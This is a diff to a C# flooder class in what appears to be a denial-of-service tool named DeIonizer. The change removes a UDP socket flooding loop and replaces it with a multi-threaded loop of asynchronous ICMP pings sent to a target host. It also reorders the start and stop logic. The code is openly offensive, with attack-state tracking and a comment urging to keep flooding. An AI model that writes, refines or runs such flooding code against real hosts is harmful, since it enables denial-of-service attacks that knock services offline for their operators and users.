@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.Net;
 using System.Net.NetworkInformation;
-using System.Net.Sockets;
 using System.Threading;
 
 namespace DeIonizer.Core.Flooders
@@ -34,26 +33,10 @@ namespace DeIonizer.Core.Flooders
                     {
                         try
                         {
-                            pinger.SendPingAsync(remoteHost.Address);
-                            Requested++;
-                        }
-                        catch { Failed++; }
-                    }
-                    using (var socket = new Socket(remoteHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
-                    {
-                        socket.Blocking = false;
-                        State = AttackStatus.Requesting; // SET STATE TO REQUESTING //
-
-                        //Keep flooding!
-                        try
-                        {
                             while (IsFlooding)
                             {
-                                var buf = System.Text.Encoding.ASCII.GetBytes(Message);
-                                socket.SendTo(buf, SocketFlags.None, remoteHost);
+                                pinger.SendPingAsync(remoteHost.Address);
                                 Requested++;
-                                //Give the CPU a break
-                                if (Delay >= 0) Thread.Sleep(Delay + 1);
                             }
                         }
                         catch { Failed++; }
@@ -70,6 +53,7 @@ namespace DeIonizer.Core.Flooders
 
         public override void Start()
         {
+            base.Start();
             for (int i = 0; i < Threads; i++)
             {
                 WorkerThreads.Add(new Thread(SpamLoop));
@@ -78,13 +62,12 @@ namespace DeIonizer.Core.Flooders
             {
                 worker.Start();
             }
-            base.Start();
         }
 
         public override void Stop()
         {
-            Initialize(); //Nuke everything
             base.Stop();
+            Initialize(); //Nuke everything
         }
 
         public override void Reset()
